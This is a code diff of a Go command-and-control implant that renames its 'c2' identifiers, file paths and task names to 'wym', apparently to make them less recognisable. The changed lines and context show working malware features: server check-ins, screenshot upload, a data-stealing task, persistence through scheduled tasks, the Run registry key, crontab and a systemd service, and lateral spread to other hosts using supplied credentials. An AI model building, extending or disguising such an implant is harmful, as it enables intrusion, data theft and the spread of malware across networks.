@@ -16,15 +16,15 @@
 //
 // Environment variables (accepted when the flag is not given):
 //
-//	C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+//	WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 //
 // Flags:
 //
-//	--server URL      server base URL (required unless C2_SERVER is set)
-//	--token TOKEN     shared agent token (required unless C2_TOKEN is set)
+//	--server URL      server base URL (required unless WYM_SERVER is set)
+//	--token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 //	--interval N      heartbeat interval in seconds (default 10, min 1)
 //	--jitter N        random jitter in seconds added to the interval
-//	--state FILE      state file persisting the agent id (default ~/.c2agent_go.json)
+//	--state FILE      state file persisting the agent id (default ~/.wymagent_go.json)
 //	--verbose         print activity to stdout
 //	-h, --help        show this help and exit
 //
@@ -95,7 +95,7 @@ type resultBody struct {
 	Error    string `json:"error"`
 }
 
-type c2Task struct {
+type wymTask struct {
 	TaskID string            `json:"task_id"`
 	Type   string            `json:"type"`
 	Args   map[string]string `json:"args"`
@@ -334,15 +334,15 @@ func register() error {
 	return nil
 }
 
-func checkin() ([]c2Task, error) {
+func checkin() ([]wymTask, error) {
 	var resp struct {
-		Tasks []c2Task `json:"tasks"`
+		Tasks []wymTask `json:"tasks"`
 	}
 	err := postJSON("/api/checkin", checkinBody{AgentID: agentID}, &resp)
 	return resp.Tasks, err
 }
 
-func report(t c2Task, res resultBody) {
+func report(t wymTask, res resultBody) {
 	res.AgentID = agentID
 	res.TaskID = t.TaskID
 	if err := postJSON("/api/result", res, nil); err != nil {
@@ -470,7 +470,7 @@ func upload(taskID string, args map[string]string) (string, int) {
 
 // screenshot captures the screen to a PNG and uploads it to the server.
 func screenshot(taskID string, label string) (string, int) {
-	tmp, err := os.CreateTemp("", "c2shot-*.png")
+	tmp, err := os.CreateTemp("", "wymshot-*.png")
 	if err != nil {
 		return "error: " + err.Error(), 1
 	}
@@ -962,7 +962,7 @@ func stealTask(taskID string, args map[string]string) (string, int) {
 		profile = "all"
 	}
 
-	work, err := os.MkdirTemp("", "c2steal_")
+	work, err := os.MkdirTemp("", "wymsteal_")
 	if err != nil {
 		return "error: " + err.Error(), 1
 	}
@@ -1057,17 +1057,17 @@ func persistenceTask(args map[string]string) (string, int) {
 		if appdata == "" {
 			appdata = "."
 		}
-		dir := filepath.Join(appdata, "Microsoft", "Windows", "c2update")
+		dir := filepath.Join(appdata, "Microsoft", "Windows", "wymupdate")
 		if err := os.MkdirAll(dir, 0o755); err != nil {
-			return fmt.Sprintf("persistence: failed to copy self to %s", filepath.Join(dir, "c2agent.exe")), 1
+			return fmt.Sprintf("persistence: failed to copy self to %s", filepath.Join(dir, "wymagent.exe")), 1
 		}
-		dest = filepath.Join(dir, "c2agent.exe")
+		dest = filepath.Join(dir, "wymagent.exe")
 	} else {
 		home, err := os.UserHomeDir()
 		if err != nil {
 			return "persistence: failed to copy self (no home dir)", 1
 		}
-		dir := filepath.Join(home, ".config", "c2update")
+		dir := filepath.Join(home, ".config", "wymupdate")
 		if err := os.MkdirAll(dir, 0o755); err != nil {
 			return "persistence: failed to copy self (cannot mkdir)", 1
 		}
@@ -1086,23 +1086,23 @@ func persistenceTask(args map[string]string) (string, int) {
 		if progdata == "" {
 			progdata = `C:\ProgramData`
 		}
-		launcherDir := filepath.Join(progdata, "c2update")
+		launcherDir := filepath.Join(progdata, "wymupdate")
 		if err := os.MkdirAll(launcherDir, 0o755); err != nil {
 			return "persistence: failed to write launcher (cannot mkdir)", 1
 		}
-		wrapper := filepath.Join(launcherDir, "c2relaunch.cmd")
+		wrapper := filepath.Join(launcherDir, "wymrelaunch.cmd")
 		if err := os.WriteFile(wrapper, []byte("@echo off\r\nstart \"\" /b "+relaunch+"\r\n"), 0o600); err != nil {
 			return fmt.Sprintf("persistence: failed to write launcher %s", wrapper), 1
 		}
 		out += "\npersistence: wrote launcher " + wrapper
 		ok := false
-		sh, rc := runShell(`schtasks /Create /TN "c2agent-persist" /TR "`+wrapper+`" /SC ONLOGON /RL HIGHEST /F`, 60)
+		sh, rc := runShell(`schtasks /Create /TN "wymagent-persist" /TR "`+wrapper+`" /SC ONLOGON /RL HIGHEST /F`, 60)
 		if rc == 0 {
 			ok = true
 		} else {
 			out += "\n  schtasks err: " + firstLine(sh)
-			sh2, rc2 := runShell(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v c2agent /t REG_SZ /d "`+wrapper+`" /f`, 60)
-			if rc2 == 0 {
+			sh2, rwym := runShell(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v wymagent /t REG_SZ /d "`+wrapper+`" /f`, 60)
+			if rwym == 0 {
 				ok = true
 			} else {
 				out += "\n  reg err: " + firstLine(sh2)
@@ -1117,22 +1117,22 @@ func persistenceTask(args map[string]string) (string, int) {
 	}
 
 	okCron, okSys := false, false
-	line := "@reboot " + relaunch + " # c2agent-persist"
-	sh, rc := runShell(`(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo "`+line+`") | crontab -`, 60)
+	line := "@reboot " + relaunch + " # wymagent-persist"
+	sh, rc := runShell(`(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo "`+line+`") | crontab -`, 60)
 	if rc == 0 {
 		okCron = true
 	} else {
 		out += "\n  crontab err: " + firstLine(sh)
 	}
 	home, _ := os.UserHomeDir()
-	unit := filepath.Join(home, ".config", "c2update", "c2-update.service")
-	unitText := "[Unit]\nDescription=c2 agent update\n\n[Service]\nType=simple\n" +
+	unit := filepath.Join(home, ".config", "wymupdate", "wym-update.service")
+	unitText := "[Unit]\nDescription=wym agent update\n\n[Service]\nType=simple\n" +
 		"ExecStart=/bin/sh -c \"" + relaunch + "\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n"
 	if err := os.WriteFile(unit, []byte(unitText), 0o600); err != nil {
 		out += "\n  systemctl err: cannot write unit " + unit
 	} else {
-		sh2, rc2 := runShell(`systemctl --user daemon-reload 2>&1; systemctl --user enable --now `+unit+` 2>&1`, 60)
-		if rc2 == 0 {
+		sh2, rwym := runShell(`systemctl --user daemon-reload 2>&1; systemctl --user enable --now `+unit+` 2>&1`, 60)
+		if rwym == 0 {
 			okSys = true
 		} else {
 			out += "\n  systemctl err: " + firstLine(sh2)
@@ -1245,12 +1245,12 @@ func lateralDeployWin(host, user, pass, self string) string {
 	}
 	relaunch := `"c:\windows\` + name + `" --server ` + server + ` --token ` + token +
 		` --interval ` + strconv.Itoa(int(interval.Seconds())) + ` --jitter ` + strconv.Itoa(int(jitter.Seconds()))
-	sh, rc = runShell(`schtasks /Create /S `+host+` /TN "c2agent-lateral" /TR "`+relaunch+`" /SC ONLOGON /RU `+user+` /RP `+pass+` /RL HIGHEST /F`, 30)
+	sh, rc = runShell(`schtasks /Create /S `+host+` /TN "wymagent-lateral" /TR "`+relaunch+`" /SC ONLOGON /RU `+user+` /RP `+pass+` /RL HIGHEST /F`, 30)
 	runShell(`net use "`+share+`" /delete /y`, 20)
 	if rc != 0 {
 		return "deployed (file dropped; task: " + firstLine(sh) + ")"
 	}
-	return "deployed (file dropped + scheduled c2agent-lateral)"
+	return "deployed (file dropped + scheduled wymagent-lateral)"
 }
 
 func lateralDeployUnix(host, user, pass, self string) string {
@@ -1277,10 +1277,10 @@ func lateralTask(args map[string]string) (string, int) {
 	user := strings.TrimSpace(args["user"])
 	pass := strings.TrimSpace(args["pass"])
 	if user == "" {
-		user = strings.TrimSpace(os.Getenv("C2_LAT_USER"))
+		user = strings.TrimSpace(os.Getenv("WYM_LAT_USER"))
 	}
 	if pass == "" {
-		pass = strings.TrimSpace(os.Getenv("C2_LAT_PASS"))
+		pass = strings.TrimSpace(os.Getenv("WYM_LAT_PASS"))
 	}
 	self, err := os.Executable()
 	if err != nil || self == "" {
@@ -1295,7 +1295,7 @@ func lateralTask(args map[string]string) (string, int) {
 	for _, host := range peers {
 		var status string
 		if user == "" || pass == "" {
-			status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
+			status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)"
 			skipped++
 		} else if runtime.GOOS == "windows" {
 			status = lateralDeployWin(host, user, pass, self)
@@ -1316,7 +1316,7 @@ func lateralTask(args map[string]string) (string, int) {
 	return strings.Join(lines, "\n"), 0
 }
 
-func execute(t c2Task) resultBody {
+func execute(t wymTask) resultBody {
 	res := resultBody{ExitCode: 0}
 	switch t.Type {
 	case "shell":
@@ -1379,12 +1379,12 @@ func execute(t c2Task) resultBody {
 // ----------------------------------------------------------------- main
 
 func main() {
-	serverFlag := flag.String("server", os.Getenv("C2_SERVER"), "C2 server URL")
-	tokenFlag := flag.String("token", os.Getenv("C2_TOKEN"), "agent token")
-	intervalFlag := flag.Int("interval", envInt("C2_INTERVAL", 10), "heartbeat interval in seconds")
-	jitterFlag := flag.Int("jitter", envInt("C2_JITTER", 0), "random jitter in seconds (added to interval)")
-	stateFlag := flag.String("state", envStr("C2_STATE_FILE", homeFile(".c2agent_go.json")), "state file")
-	verboseFlag := flag.Bool("verbose", envBool("C2_VERBOSE"), "print activity")
+	serverFlag := flag.String("server", os.Getenv("WYM_SERVER"), "C2 server URL")
+	tokenFlag := flag.String("token", os.Getenv("WYM_TOKEN"), "agent token")
+	intervalFlag := flag.Int("interval", envInt("WYM_INTERVAL", 10), "heartbeat interval in seconds")
+	jitterFlag := flag.Int("jitter", envInt("WYM_JITTER", 0), "random jitter in seconds (added to interval)")
+	stateFlag := flag.String("state", envStr("WYM_STATE_FILE", homeFile(".wymagent_go.json")), "state file")
+	verboseFlag := flag.Bool("verbose", envBool("WYM_VERBOSE"), "print activity")
 	flag.Parse()
 
 	if *serverFlag == "" || *tokenFlag == "" {
